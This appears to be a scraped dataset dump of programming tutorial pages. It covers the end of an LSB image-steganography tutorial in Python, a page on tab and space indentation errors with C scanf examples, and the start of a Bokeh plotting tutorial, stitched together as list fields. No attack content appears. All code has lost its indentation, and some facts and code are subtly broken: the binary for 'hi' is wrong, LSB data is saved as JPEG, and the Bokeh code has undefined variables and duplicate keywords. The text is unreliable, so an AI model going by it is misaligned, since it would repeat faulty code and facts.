convert any type of data into binary. We will be using this method to convert the secret data and pixel values to binary in the encoding and decoding phase.', 'Once the conversion into the binary format is complete, we will define a function in order to hide a secret message in the image by changing the Least Significant Bit.', 'Now, we will write a function to decode the hidden message from the Steganographic image. Let us consider the following script to understand the same:', 'We will now define a function that accepts the name of the image and secret message from the user. We will also call the hide_data() function in order to encode the message.', 'Now, we will define a function to ask the user to enter the name of the image file that has to be decoded and call the show_data() function in order to return the decoded message.', 'We will now set up the main function in order to commence the operation of image steganography. We will include a menu for the user to either encode the data or decode one and continue the execution afterward.']","['Steganography refers to the process of hiding a secret message within a larger one in such a manner that someone cannot know the presence or contents of the hidden message. The objective of Steganography is to maintain secret communication between two parties. Unlike Cryptography, where we can conceal the contents of a secret message, Steganography conceals the fact that a message is transmitted. Even though Steganography differs from Cryptography, there are various analogies between the two. Some authors classify Steganography as a form of Cryptography as hidden communication seems like a secret message.', 'As we know, Cryptography has always had its ultimate role in protecting the confidentiality between the sender and the expected receiver. However, the usage of the methods of Steganography besides Cryptography has increased gradually to include more protective layers to the hidden data. One of the benefits of utilizing Steganography over Cryptography alone is that the proposed secret message does not attract attention to itself as an object of scrutiny. Visible encrypted messages, no matter how unbreakable they are, arouse interest and may in themselves be convicting in countries where encryption is illegal.', 'As we can observe in the above image, both the actual file (X) and secret message (M) that must be hidden are fed into a steganographic encoder as input. Steganographic Encoder function, f(X, M, K) embeds the secret message into a cover image file using techniques like least significant bit encoding. The resulting stego image looks very similar to your cover image file, with no visible changes. This completes encoding. To retrieve the secret message, the stego object is fed into Steganographic Decoder.', 'We can describe a digital image as a finite set of digital values, known as Pixels. Pixels are the smallest individual element of an image, holding values representing the brightness of a particular colour at any specific point. Thus, we can think of an image as a matrix (or a two-dimensional array) of pixels consisting of a static number of rows and columns.', 'From the above image, we can observe that if we alter the Most Significant Bit (or MSB), it will have a larger impact on the final values; however, if we alter the Least Significant Bit (or LSB), the impact on the final value is minimal. Hence, we use Least Significant Bit (LSB) Steganography.', 'Each pixel consists of three values - Red, Green, Blue. These values range from 0 to 255, which means that they are 8-bit values. Let us understand the working of this technique using an example. Suppose that we want to hide the message ""hi"" into an image of size 4x4, which has the pixel values as shown below:', 'With the help of the ASCII Table, we can convert the secret message into decimal values and then into a binary form: 0110100 0110101. Now, we can iterate through the pixel values one after one. Once we convert them into binary, we can replace each least significant bit with that message bits in a sequential manner (For instance, the binary of 225 is 11100001, we can then replace the last bit, the bit in the right (1), with the initial data bit (0) and so on). This will allow us to modify the values of the pixel by +1 or -1 only, which is not perceptible at all. The output values of the pixels after performing LSBS is as follows:', 'In the above snippet, we have defined a function as msg_to_bin() that accepts the msg parameter in the form of data input by the user. We have then used the if-elif-else conditional statements to check the data type of the input secret data in the form of the message and image and convert them into Binary.', 'In the above snippet of code, we have defined a function that accepts two parameters in the form of an image file and a secret message. We have then calculated the maximum bytes for encoding and checked if the number of bytes to encode is less than the maximum bytes in the image. We have then set the index of the data to 0 and converted the secret data into binary. We then found the length of data and used the for-loop to iterate through pixel values in the image, convert the RGB values to binary format, and hide the data for each pixel.', 'In the above snippet of code, we have defined the show_data() function that accepts the image file. Within this function, we have defined empty binary data and used the for-loop to iterate through the image pixels and convert the RGB pixels into binary format. We have also extracted the data from each pixel, and we have then split them by 8-bits and converted them to characters. At last, we checked the delimiter and removed it to display the actual hidden message.', 'In the above snippet of code, we have defined a function as encodeText() to encode the secret message along with the image. Within the function, we have asked the user for the name of the image file using the input() function and used the OpenCV library to read that file. We have then printed the details of the image along with the image itself. We have then asked the user for the text message to be encoded and the new file name for the encoded image. At last, we have called the hide_data() function in order to hide the secret message in the selected image.', 'In the above snippet of code, we have defined another function as decodeText() that allows the user to decode any image file. Within this function, we have asked the user for the name of the image file that has to be decoded and read the same using one of the functions of the OpenCV library. We have then resized the image and displayed the Steganographic image. We have also extracted the secret text data from the image file by calling the show_data() function and returning text for the users.', ""In the above snippet of code, we have defined the main function as steganography(). We created a menu within this function and asked the users for their input as 'int' data type. We have then used the if-elif-else conditional statements to execute the function as per the user input. At last, we have called this main function to execute the program.""]","['[(225, 12, 99), (155, 2, 50), (99, 51, 15), (15, 55, 22), (155, 61, 87), (63, 30, 17), (1, 55, 19), (99, 81, 66), (219l, 77, 91), (69, 39, 50), (18, 200, 33), (25, 54, 190)]', '[(224, 13, 99), (154, 3, 50), (98, 50, 15), (15, 54, 23), (154, 61, 87), (63, 30, 17), (1, 55, 19), (99, 81, 66), (219, 77, 91), (69, 39, 50), (18, 200, 33), (25, 54, 190)]', '# importing the required libraries', 'import cv2', 'import numpy as np', 'import types', '# converting types to binary', 'def msg_to_bin(msg):', 'if type(msg) == str:', 'return \'\'.join([format(ord(i), ""08b"") for i in msg])', 'elif type(msg) == bytes or type(msg) == np.ndarray:', 'return [format(i, ""08b"") for i in msg]', 'elif type(msg) == int or type(msg) == np.uint8:', 'return format(msg, ""08b"")', 'else:', 'raise TypeError(""Input type not supported"")', '# defining function to hide the secret message into the image', 'def hide_data(img, secret_msg):', '# calculating the maximum bytes for encoding', 'nBytes = img.shape[0] * img.shape[1] * 3 // 8', 'print(""Maximum Bytes for encoding:"", nBytes)', '# checking whether the number of bytes for encoding is less', '# than the maximum bytes in the image', 'if len(secret_msg) > nBytes:', 'raise ValueError(""Error encountered insufficient bytes, need bigger image or less data!!"")', ""secret_msg += '#####'       # we can utilize any string as the delimiter"", 'dataIndex = 0', '# converting the input data to binary format using the msg_to_bin() function', 'bin_secret_msg = msg_to_bin(secret_msg)', '# finding the length of data that requires to be hidden', 'dataLen = len(bin_secret_msg)', 'for values in img:', 'for pixels in values:', '# converting RGB values to binary format', 'r, g, b = msg_to_bin(pixels)', '# modifying the LSB only if there is data remaining to store', 'if dataIndex < dataLen:', '# hiding the data into LSB of Red pixel', 'pixels[0] = int(r[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', 'if dataIndex < dataLen:', '# hiding the data into LSB of Green pixel', 'pixels[1] = int(g[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', 'if dataIndex < dataLen:', '# hiding the data into LSB of Blue pixel', 'pixels[2] = int(b[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', '# if data is encoded, break out the loop', 'if dataIndex >= dataLen:', 'break', 'return img', 'def show_data(img):', 'bin_data = """"', 'for values in img:', 'for pixels in values:', '# converting the Red, Green, Blue values into binary format', 'r, g, b = msg_to_bin(pixels)', '# data extraction from the LSB of Red pixel', 'bin_data += r[-1]', '# data extraction from the LSB of Green pixel', 'bin_data += g[-1]', '# data extraction from the LSB of Blue pixel', 'bin_data += b[-1]', '# splitting by 8-bits', 'allBytes = [bin_data[i: i + 8] for i in range(0, len(bin_data), 8)]', '# converting from bits to characters', 'decodedData = """"', 'for bytes in allBytes:', 'decodedData += chr(int(bytes, 2))', '# checking if we have reached the delimiter which is ""#####""', 'if decodedData[-5:] == ""#####"":', 'break', '# print(decodedData)', '# removing the delimiter to display the actual hidden message', 'return decodedData[:-5]', '# defining function to encode data into Image', 'def encodeText():', 'img_name = input(""Enter image name (with extension): "")', '# reading the input image using OpenCV-Python', 'img = cv2.imread(img_name)', '# printing the details of the image', 'print(""The shape of the image is: "", img.shape) # checking the image shape to calculate the number of bytes in it', 'print(""The original image is as shown below: "")', '# resizing the image as per the need', 'resizedImg = cv2.resize(img, (500, 500))', '# displaying the image', 'cv2_imshow(resizedImg)', 'data = input(""Enter data to be encoded: "")', 'if (len(data) == 0):', ""raise ValueError('Data is Empty')"", 'file_name = input(""Enter the name of the new encoded image (with extension): "")', '# calling the hide_data() function to hide the secret message into the selected image', 'encodedImage = hide_data(img, data)', 'cv2.imwrite(file_name, encodedImage)', '# defining the function to decode the data in the image', 'def decodeText():', '# reading the image containing the hidden image', 'img_name = input(""Enter the name of the Steganographic image that has to be decoded (with extension): "")', 'img = cv2.imread(img_name)  # reading the image using the imread() function', 'print(""The Steganographic image is as follow: "")', 'resizedImg = cv2.resize(img, (500, 500))    # resizing the actual image as per the needs', 'cv2_imshow(resizedImg)  # displaying the Steganographic image', 'text = show_data(img)', 'return text', '# image steganography', 'def steganography():', 'n = int(input(""Image Steganography \\n1. Encode the data \\n2. Decode the data \\n Select the option: ""))', 'if (n == 1):', 'print(""\\nEncoding..."")', 'encodeText()', 'elif (n == 2):', 'print(""\\nDecoding..."")', 'print(""Decoded message is "" + decodeText())', 'else:', 'raise Exception(""Inserted value is incorrect!"")', 'steganography() # encoding the image', '# importing the required libraries', 'import cv2', 'import numpy as np', 'import types', 'from google.colab.patches import cv2_imshow', '# converting types to binary', 'def msg_to_bin(msg):', 'if type(msg) == str:', 'return \'\'.join([format(ord(i), ""08b"") for i in msg])', 'elif type(msg) == bytes or type(msg) == np.ndarray:', 'return [format(i, ""08b"") for i in msg]', 'elif type(msg) == int or type(msg) == np.uint8:', 'return format(msg, ""08b"")', 'else:', 'raise TypeError(""Input type not supported"")', '# defining function to hide the secret message into the image', 'def hide_data(img, secret_msg):', '# calculating the maximum bytes for encoding', 'nBytes = img.shape[0] * img.shape[1] * 3 // 8', 'print(""Maximum Bytes for encoding:"", nBytes)', '# checking whether the number of bytes for encoding is less', '# than the maximum bytes in the image', 'if len(secret_msg) > nBytes:', 'raise ValueError(""Error encountered insufficient bytes, need bigger image or less data!!"")', ""secret_msg += '#####'       # we can utilize any string as the delimiter"", 'dataIndex = 0', '# converting the input data to binary format using the msg_to_bin() function', 'bin_secret_msg = msg_to_bin(secret_msg)', '# finding the length of data that requires to be hidden', 'dataLen = len(bin_secret_msg)', 'for values in img:', 'for pixels in values:', '# converting RGB values to binary format', 'r, g, b = msg_to_bin(pixels)', '# modifying the LSB only if there is data remaining to store', 'if dataIndex < dataLen:', '# hiding the data into LSB of Red pixel', 'pixels[0] = int(r[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', 'if dataIndex < dataLen:', '# hiding the data into LSB of Green pixel', 'pixels[1] = int(g[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', 'if dataIndex < dataLen:', '# hiding the data into LSB of Blue pixel', 'pixels[2] = int(b[:-1] + bin_secret_msg[dataIndex], 2)', 'dataIndex += 1', '# if data is encoded, break out the loop', 'if dataIndex >= dataLen:', 'break', 'return img', 'def show_data(img):', 'bin_data = """"', 'for values in img:', 'for pixels in values:', '# converting the Red, Green, Blue values into binary format', 'r, g, b = msg_to_bin(pixels)', '# data extraction from the LSB of Red pixel', 'bin_data += r[-1]', '# data extraction from the LSB of Green pixel', 'bin_data += g[-1]', '# data extraction from the LSB of Blue pixel', 'bin_data += b[-1]', '# split by 8-Bits', 'allBytes = [bin_data[i: i + 8] for i in range(0, len(bin_data), 8)]', '# converting from bits to characters', 'decodedData = """"', 'for bytes in allBytes:', 'decodedData += chr(int(bytes, 2))', '# checking if we have reached the delimiter which is ""#####""', 'if decodedData[-5:] == ""#####"":', 'break', '# print(decodedData)', '# removing the delimiter to display the actual hidden message', 'return decodedData[:-5]', '# defining function to encode data into Image', 'def encodeText():', 'img_name = input(""Enter image name (with extension): "")', '# reading the input image using OpenCV-Python', 'img = cv2.imread(img_name)', '# printing the details of the image', 'print(""The shape of the image is: "", img.shape) # checking the image shape to calculate the number of bytes in it', 'print(""The original image is as shown below: "")', '# resizing the image as per the need', 'resizedImg = cv2.resize(img, (500, 500))', '# displaying the image', 'cv2_imshow(resizedImg)', 'data = input(""Enter data to be encoded: "")', 'if (len(data) == 0):', ""raise ValueError('Data is Empty')"", 'file_name = input(""Enter the name of the new encoded image (with extension): "")', '# calling the hide_data() function to hide the secret message into the selected image', 'encodedImage = hide_data(img, data)', 'cv2.imwrite(file_name, encodedImage)', '# defining the function to decode the data in the image', 'def decodeText():', '# reading the image containing the hidden image', 'img_name = input(""Enter the name of the Steganographic image that has to be decoded (with extension): "")', 'img = cv2.imread(img_name)  # reading the image using the imread() function', 'print(""The Steganographic image is as follow: "")', 'resizedImg = cv2.resize(img, (500, 500))    # resizing the actual image as per the needs', 'cv2_imshow(resizedImg)  # displaying the Steganographic image', 'text = show_data(img)', 'return text', '# image steganography', 'def steganography():', 'n = int(input(""Image Steganography \\n1. Encode the data \\n2. Decode the data \\n Select the option: ""))', 'if (n == 1):', 'print(""\\nEncoding..."")', 'encodeText()', 'elif (n == 2):', 'print(""\\nDecoding..."")', 'print(""Decoded message is "" + decodeText())', 'else:', 'raise Exception(""Inserted value is incorrect!"")', 'steganography() # encoding the image']","['Image Steganography', '1. Encode the data', '2. Decode the data', 'Select the option: 1', 'Encoding...', 'Enter image name (with extension): my_image.jpg', 'The shape of the image is:  (1080, 1920, 3)', 'The original image is as shown below:', 'Enter data to be encoded: python tutorial', 'Enter the name of the new encoded image (with extension): testimage.jpg', 'Maximum bytes to encode: 589693', 'Image Steganography', '1. Encode the data', '2. Decode the data', 'Select the option: 2', 'Decoding...', 'Enter the name of the Steganographic image that has to be decoded (with extension): testimage.jpg', 'The Steganographic image is as follow:', 'Decoded message is python tutorial']",[],['|||Text Steganography|||Image Steganography|||Video Steganography|||Audio Steganography|||Network Steganography|||E-mail Steganography|||']
405,['Inconsistent use of tabs and spaces in indentation'],"['The word indentation here refers to the number of spaces and tabs while beginning any statement or block of code. The use of these whitespaces and tabs must match while a certain code block ends; thus, it refers to the proper indentation of a particular block.']","['https://www.javatpoint.com/how-to-plot-multiple-plots-using-bokeh-in-python', 'https://www.javatpoint.com/image-steganography-using-python', 'https://www.javatpoint.com/how-to-plot-multiple-plots-using-bokeh-in-python', 'https://www.javatpoint.com/image-steganography-using-python', 'https://www.javatpoint.com/how-to-plot-multiple-plots-using-bokeh-in-python']","['https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation1.png', 'https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation2.png', 'https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation3.png', 'https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation4.png', 'https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation5.png', 'https://static.javatpoint.com/python/images/inconsistent-use-of-tabs-and-spaces-in-indentation6.png']",[],"['How does indentation work in Python?', 'What happens when we do inconsistent use of whitespaces and tabs?', 'Examples of inconsistent use of tabs and whitespaces']",['How to rectify the inconsistency in code due to unnecessary use of whitespaces and tabs?'],[],"['In the Python programming language, the indentation of each block of code plays a very important role in indicating a particular code block.', 'To rectify the error, we have to follow the steps that are mentioned below:', 'Now let us understand it in more detail with the help of examples:', 'Example 1:', 'The output of the above program:', 'Correction of example 1:', 'The output of the above program:', 'Example 2:', 'The output of the above program:', 'Correction of example 2:', 'The output of the above program:', 'Example 3:', 'The output of the above program:', 'Correction of example 3:', 'The output of the above program:', 'Here the output of the above program is perfect, just by removing the unwanted whitespaces in the scanf function.', 'Example 4:', 'The output of the above program:', 'Due to whitespaces, the output cannot be generated even though the program is correct.', 'The correction of the above code is as follows:', 'Correction of example 4:', 'The output of the above program:', 'Here the output of the above program is perfect, just by removing the unwanted whitespaces in the scanf function.']","['As we talk about the python programming language, when we inconsistently apply the number of whitespaces even at unnecessary places that were not required, it will ultimately generate an indentation error.', 'The above-highlighted block will generate the indentation error due to an unmatched number of whitespaces and tabs while starting that code block with its ending. Even a nested indentation will affect the above block of code.', 'The above program will perfectly work as if the error has been rectified by matching the number of whitespaces and tabs used to represent a certain code block.', 'The above-highlighted block will generate the indentation error due to an unmatched number of whitespaces and tabs while starting that code block with its ending. Even a nested indentation will affect the above block of code.', 'The above program will perfectly work as if the error has been rectified by matching the number of whitespaces and tabs used to represent a certain code block.']","['The indentation term here refers to matching the number of tabs and whitespaces used before starting any block of code and the end of a certain block of code because it ultimately represents a block of code. Similarly, in this way, we can do the use nested code blocks, but the indentation of that block of codes refer from block to block.', 'If we talk about starting block, there is no use of any whitespace and tab, but when we do move further for the upcoming second block of code, we use the 2 whitespaces. While starting the certain block of code, for its ending, we will do the same and apply the 2 whitespaces, which indicates the ending of that block of code.', 'If we want to include more nested blocks of code, we will apply more whitespaces than the previous block of code, which indicates the starting of the next nested block of code. We will apply the same number of whitespaces as we have done at starting that block of code for its ending.', 'Similarly, in this way, we can add more nested blocks, and the starting and end of each block will differ in the use of the number of whitespaces used to represent a particular block of code. But as we use the nested block of codes while going nested inside, the number of whitespaces and tabs has increased.', 'The indentation error will occur when we start the block of code properly, but while ending it, we will use the irregular use of several whitespaces and tabs for indicating that particular block of code; hence it will generate an error due to an unmatched number of whitespaces and tabs.', ""If we talk about the C programming language, the number of whitespaces and tabs is immaterial; it does not generate any error because the C compiler ignores it. But sometimes, it may generate unusual things while running the ' scanf ' function and applying the extra whitespace; we will understand it by discussing it in more detail."", 'The output of the above program can be generated correctly. Although it will not generate any error, we will not get the desired output if we use unnecessary whitespaces. One extra element in scanf function will disturb the working of the above program. Thus, it is known as the inconsistent use of tabs and spaces in the above program.']","['# Python Program to find the smallest odd number from the given number', 'n=int(input(""Enter a number ""))', 'count = 0', 'while( i != 0 ):                                        # This loop will count the number of digits', '# present in the given number', 'count = count + 1', 'i = i / 10', 'j = count - 1', 'A = [int(i) for i in str(n)]    # This loop will allocate the each digits seperately in the list A', 'minodd = 10000', 'for i in A:', 'if( i % 2 != 0 ):', 'if( i < minodd ):                   # This condition will find the minimum odd digit', '# present in the array, if any', 'minodd = i;', 'if ( minodd == 10000 ):        # If in case no smallest odd digit found then it will', '# assign the -1 to minodd, which indicates no odd digit found', 'minodd = -1', 'print(""Minimum odd number found is: "" , minodd )', '# Python Program to find the smallest odd number from the given number', 'n=int(input(""Enter a number ""))', 'count = 0', 'while( i != 0 ):                                        # This loop will count the number of digits', '# present in the given number', 'count = count + 1', 'i = i / 10', 'j = count - 1', 'A = [int(i) for i in str(n)]    # This loop will allocate the each digits seperately in the list A', 'minodd = 10000', 'for i in A:', 'if( i % 2 != 0 ):', 'if( i < minodd ):                   # This condition will find the minimum odd digit', '# present in the array, if any', 'minodd = i;', 'if ( minodd == 10000 ):        # If in case no smallest odd digit found then it will', '# assign the -1 to minodd, which indicates no odd digit found', 'minodd = -1', 'print(""Minimum odd number found is: "" , minodd )', '# Python program to implement the file concept using readline() for reading a file', 'Fruit = [ ""Apple\\n"" , ""Graphs\\n"" , ""Mango\\n"" , ""Orange\\n"" , ""Kiwi\\n"" ]', '# Writing to a file', ""file1 = open('new.txt', 'w')"", 'file1.writelines((Fruit))                          # writelines is used to write the data into the file in                                                # the form of list, by inserting multiple values at a same time,', '# here we are taking new.txt file', '', 'file1.close()                                       # This instruction is used to close the file, i.e., hello.txt', '', '# Using readline()', ""file1 = open('new.txt', 'r')"", 'count = 0', 'while True:', 'count = count + 1', '# Get next line from file', 's = file1.readline()', '# if line is empty', '# end of file is reached', 'if not s:', 'break', 'print(""Statement{}: {}"".format(count, s.strip()))', 'file1.close()', '# Python program to implement the file concept using readline() for reading a file', 'Fruit = [ ""Apple\\n"" , ""Graphs\\n"" , ""Mango\\n"" , ""Orange\\n"" , ""Kiwi\\n"" ]', '# Writing to a file', ""file1 = open('new.txt', 'w')"", 'file1.writelines((Fruit))                          # writelines is used to write the data into the file in                                                # the form of list, by inserting multiple values at a same time,', '# here we are taking new.txt file', '', 'file1.close()                                       # This instruction is used to close the file, i.e., hello.txt', '', '# Using readline()', ""file1 = open('new.txt', 'r')"", 'count = 0', 'while True:', 'count = count + 1', '# Get next line from file', 's = file1.readline()', '# if line is empty', '# end of file is reached', 'if not s:', 'break', 'print(""Statement{}: {}"".format(count, s.strip()))', 'file1.close()', '#include<stdio.h>', 'int bs( int a[] , int i ,int j ,int x )           // This function will return the corresponding', 'if ( i == j )', 'if ( a [ i ] == x )', 'return i ;', 'return ( -1 ) ;', 'int mid ;', 'mid = ( i + j ) / 2 ;', 'if ( x == a[ mid ] )', 'return mid ;', 'if ( x < a[ mid ] )', 'bs ( a , i , mid - 1 , x ) ;', 'else', 'bs ( a , mid + 1 , j , x ) ;', 'void main()', 'int A[ 100 ] , n , i , val ;', 'printf( "" Enter size of Array: "" ) ;', 'scanf ("" %d "" , &n ) ;', 'printf( "" Enter Array \\n "" ) ;', 'for( i = 0 ; i < n ; i++ )', 'scanf ( "" %d"" , &A[ i ] ) ;', 'printf( "" Enter element to search: "" ) ;', 'scanf("" %d "" , &val ) ;', 'int pos = bs( A , 0 , n , val ) ;                                    // pos will hold the index', 'printf( "" Element found at : %d "" , pos ) ;', '#include<stdio.h>', 'int bs( int a[] , int i ,int j ,int x )           // This function will return the corresponding', 'if ( i == j )', 'if ( a [ i ] == x )', 'return i ;', 'return ( -1 ) ;', 'int mid ;', 'mid = ( i + j ) / 2 ;', 'if ( x == a[ mid ] )', 'return mid ;', 'if ( x < a[ mid ] )', 'bs ( a , i , mid - 1 , x ) ;', 'else', 'bs ( a , mid + 1 , j , x ) ;', 'void main()', 'int A[ 100 ] , n , i , val ;', 'printf( "" Enter size of Array: "" ) ;', 'scanf ("" %d"" , &n ) ;', 'printf( "" Enter Array \\n "" ) ;', 'for( i = 0 ; i < n ; i++ )', 'scanf ( "" %d"" , &A[ i ] ) ;', 'printf( "" Enter element to search: "" ) ;', 'scanf("" %d "" , &val ) ;', 'int pos = bs( A , 0 , n , val ) ;                                    // pos will hold the index', 'printf( "" Element found at : %d "" , pos ) ;', '#include<stdio.h>', '#include<time.h>', 'int fib( int n )                        // This function will return the fibonacci value', 'if ( n <= 1 )', 'return 0 ;', 'if ( n == 2 )', 'return 1 ;', 'return fib( n - 1 ) + fib ( n - 2 ) ;', 'void main()', 'double time_spent = 0.0 ;', 'int i , n ;', 'printf( "" Enter terms of fibonacci series \\n "" ) ;', 'scanf( "" %d  "" , &n ) ;', 'printf( "" Fibonacci series is : \\n "" ) ;', 'clock_t begin = clock() ;', 'for( i = 1 ; i <= n ; i++ )', 'printf("" %d"" , fib( i ) ) ;', 'clock_t end  = clock() ;', 'time_spent = time_spent + (double)(end-begin)/ CLOCKS_PER_SEC ;', 'printf( "" \\n %f secs "" , time_spent ) ;', '#include<stdio.h>', '#include<time.h>', 'int fib( int n )                        // This function will return the fibonacci value', 'if ( n <= 1 )', 'return 0 ;', 'if ( n == 2 )', 'return 1 ;', 'return fib( n - 1 ) + fib ( n - 2 ) ;', 'void main()', 'double time_spent = 0.0 ;', 'int i , n ;', 'printf( "" Enter terms of fibonacci series \\n "" ) ;', 'scanf( "" %d "" , &n ) ;', 'printf( "" Fibonacci series is : \\n "" ) ;', 'clock_t begin = clock() ;', 'for( i = 1 ; i <= n ; i++ )', 'printf("" %d"" , fib( i ) ) ;', 'clock_t end  = clock() ;', 'time_spent = time_spent + (double)(end-begin)/ CLOCKS_PER_SEC ;', 'printf( "" \\n %f secs "" , time_spent ) ;']","['IndentationError: expected an indented block', 'IndentationError: expected an indented block']",[],"['|||The indentation is used in the python programming language and plays a very important role.|||To initialize any block of code or begin a certain block of code, the indentation is used to identify that block of code.|||In other programming languages like C, C++, Java, C#, and many more, the indentation does not matter for starting any code block.|||Instead of indentation, these languages use curly brackets to denote a code block.|||But in the python programming language, indentation matters. The whole code and its running process start only with the matching indented block.|||In the python programming language, we did not have the concept of the main function when compared with other programming languages, like C, C++, C#, Java, and so on.|||The initial block of code does not contain any white spaces and tabs, ultimately denoting the main function; after onwards, as per the requirement of the programmer. They will use the if-else, for loop and many more the indentation vary accordingly.|||As the name suggests, inconsistent use of spaces and tabs in indentation generates a syntax error.|||When we code in any particular programming language, we need to remember the syntax accordingly; hence, we did not apply the unnecessary white spaces.|||If we do unnecessary use of whitespace and tabs, it will generate particular errors accordingly.|||If we talk about the python programming language, it is more concerned about the proper indentation and right use of whitespaces and tabs for accessing code.|||If we talk about the C programming language, it is more concerned about the proper use of brackets at the particular place wherever required for starting and closing certain blocks of code.|||But suppose we do unnecessary use of whitespaces and tabs in C language. In that case, it is ignored by the compiler because it is predefined in the working of the c compiler, that it will ignore all the whitespaces and comments while executing the program.|||&&&|||Identify the line of code that is generating the error.|||Observe the line and find its corresponding block of code.|||Match the number of whitespaces used for starting that block of code by counting the whitespaces and tabs.|||Count the number of whitespaces used to end the particular code block; if it does not match, then rectify it by applying the proper number of whitespaces and tabs.|||If still error not resolved, then match the indentation of the target block of code with the above and below block of code. For matching it, similarly as above check the number of whitespaces used for starting each block of code. It must contain the difference of 2 whitespaces. If these are nested else by randomly matching the number of whitespaces rectifies the corresponding indentation error.|||']"
406,['How to Plot Multiple Plots using Bokeh in Python'],"['Bokeh is a Python library which is used for data visualization. It creates its plots using HTML and JavaScript languages, and it also targets modern website browsers to provide presentation elegant, concise construction of novel graphics good high-performance interactivity.']","['https://www.javatpoint.com/how-to-make-an-area-plot-in-python-using-bokeh', 'https://www.javatpoint.com/inconsistent-use-of-tabs-and-spaces-in-indentation', 'https://www.javatpoint.com/how-to-make-an-area-plot-in-python-using-bokeh', 'https://www.javatpoint.com/inconsistent-use-of-tabs-and-spaces-in-indentation', 'https://www.javatpoint.com/how-to-make-an-area-plot-in-python-using-bokeh']","['https://static.javatpoint.com/python/images/how-to-plot-multiple-plots-using-bokeh-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-multiple-plots-using-bokeh-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-plot-multiple-plots-using-bokeh-in-python3.png']",[],['Conclusion'],"['Syntax:', 'Approach:', 'Example 1: To Plot Different Plots in the Same Page', 'Example 2: To Plot Different Plots in Same Frame', 'Example 3: To Plot Multiple Plots in a Row']",[],"['The syntax for show() function is:', 'In which fig1, fig2, fig3, and so on are objects of the class figure in bokeh.plotting module.', 'For plotting multiple plots on a graph by using the bokeh module, we will use the following approach:', 'In this tutorial, we have discussed how we can create multiple plots on the same page or frame.']",[],"['In this tutorial, we will learn how to plot multiple plots by using the Bokeh library in Python. We will be using the row() function of the bokeh.layouts module can be used in the show() function of bokeh.io library to illustrate multiple plots by using the bokeh library.']","['show(row(fig1, fig2, fig3..... fign))', '# First, we will import all the required libraries and modules', 'from bokeh.io import output_file as OF', 'from bokeh.io import show', 'from bokeh.layouts import row', 'from bokeh.plotting import figure as figs', '# Now we will create a new plot', 'fig1 = figs(plot_width = 400,', 'plot_height = 400, title = ""Plot 1"")', 'fig1.line([2, 1, 5, 3, 4, 7, 6],', '[1, 4, 3, 5, 2, 7, 7],', 'line_width = 4)', '# Then, we will create another plot', 'x = y = list(range(10))', 'fig2 = figs(plot_width = 400,', 'plot_height = 400, title = ""Plot 2"")', 'fig2.circle(x, y, size = 5)', '# depict visualization', 'show(row(fig1, fig2))', '# First, we will import all the required libraries and modules', 'from bokeh.io import output_file as OF', 'from bokeh.io import show', 'from bokeh.layouts import row', 'from bokeh.plotting import figure as figs', 'import numpy as nmp', 'import random as rdm', '# Now, we will create a new plot', '# instantiate the figure object', 'fig1 = figs(title = ""Plot 1"")', '# coordinates', 'x1 = [[[[1, 2, 1, 0]]],', '[[[2, 4, 1, 2], [2.7, 2.4, 3.4, 3.1]]],', '[[[3, 1, 2]]]]', 'y1 = [[[[3.5, 2.5, 2.5, 3.5]]],', '[[[1, 1, 2, 3], [1.75, 2.25, 1.25, 2.75]]],', '[[[2, 1, 3]]]]', '# Now we will give the color values of the poloygons', 'color1 = [""GREEN"", ""ORANGE"", ""BLUE""]', '# filling the alpha values of the polygons', 'fill_alpha1 = 1.5', '# Now, we will plot the graph', 'fig1.multi_polygons(x = x1, y = y1,', 'color = color1,', 'fill_alpha = fill_alpha1)', '# Then, we will create another plot', '# coordinates', 'x2 = nmp.arange(4)', 'y2 = x **2', 'z2 = x *3', 'p = nmp.linspace(2, 22, 5)', 'q = nmp.linspace(2, 12, 5)', 'r = nmp.linspace(2, 32, 7)', 'a = nmp.arange(34)', '# Here, we will create an empty figure with specific plot width and height', 'fig2 = figs(title = ""Plot 2"")', '# Then, we will plot the points in the form of circular glyphs', 'fig2.circle(x = x2, y = y2, color = ""YELLOW"", size = 20)', '# Now, we will plot the points in the form of square glyphs', 'fig2.square(x = x2, z = z2, color = ""GREEN"", size = 12, alpha = 1.5)', '# plot the points in the form of hex glyphs', 'fig2.hex(y = y2, z = z2, color = ""Pink"", size = 12, alpha = 0.7)', '# now, we will draw a line between the plotted points', 'fig2.line(x = x2, y = y2, color = ""grey"", line_width = 4)', '# plot the points in the form of inverted triangle glyph', 'fig2.inverted_triangle(p = p, q = q, color = ""Green"", size = 22, alpha = 0.4)', '# plot the points in the form of diamond glyphs', 'fig2.diamond(x = x2, r = r, color = ""RED"", size = 16, alpha = 0.8)', '# plot the points in the form of cross glyphs', 'fig2.cross(a = a, a = a, size = 14)', '# creating a third plot', '# generate the points to be plotted', 'for i in range(100):', 'x.append(i)', 'for i in range(100):', 'y.append(1 + rdm.random())', '# parameters of line 1', 'line_color = ""red""', 'line_dash = ""solid""', 'legend_label = ""Line 1""', 'fig3 = figs(title = ""Plot 3"")', '# plotting the line', 'fig3.line(x, y,', 'line_color = line_color,', 'line_dash = line_dash,', 'legend_label = legend_label)', '# plot line 2', '# generate the points to be plotted', 'for i in range(100):', 'x.append(i)', 'for i in range(100):', 'y.append(rdm.random())', '# parameters of line 2', 'line_color = ""green""', 'line_dash = ""dotdash""', 'line_dash_offset = 1', 'legend_label = ""Line 2""', '# plotting the line', 'fig3.line(x, y,', 'line_color = line_color,', 'line_dash = line_dash,', 'line_dash_offset = line_dash_offset,', 'legend_label = legend_label)', '# depict visualization', 'show(row(fig1, fig2, fig3))', '# First, we will import all the required libraries and modules', 'from bokeh.io import output_file as OF', 'from bokeh.io import show', 'from bokeh.layouts import row', 'from bokeh.plotting import figure as figs', '# now, we will assign coordinates', 'x = y = list(range(10))', 'xs = [[[[1, 1, 2, 2]]]]', 'ys = [[[[4, 3, 